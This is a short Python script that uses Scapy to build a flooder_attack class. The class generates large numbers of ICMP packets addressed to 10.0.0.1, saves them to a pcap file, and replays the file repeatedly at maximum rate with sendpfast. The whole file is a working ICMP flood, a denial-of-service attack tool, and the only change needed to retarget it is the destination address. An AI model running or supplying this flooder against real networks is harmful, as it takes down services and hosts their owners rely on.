#! /usr/bin/env python3

from scapy.all import IP, ICMP, wrpcap, rdpcap, sendpfast

class flooder_attack(object):

    def generator(self, n, filename):

        time = 0.00114108 * n + 0.157758
        minutes = time/60

        print('Generating packets, it will take %s seconds, moreless (%s, minutes)' % (time, minutes))

        pkgs = [IP(dst='10.0.0.1')/ICMP() for i in range(n)]
        wrpcap(filename, pkgs)

        print('%s packets generated.' % (n))

    def flooder(self, n, filename):

        print('Reading pcap file.')
        pkgs = rdpcap(filename)

        for i in range(n):
            print('Sending %s packets.' % (len(pkgs)))
            sendpfast(pkgs)
            print('Done, part %s of %s' % ((i + 1), n))

    def __init__(self, number, generator, filename):
        print('Initializing')
        if generator is True:
            self.generator(number, filename)
        else:
            self.flooder(number, filename)
        exit()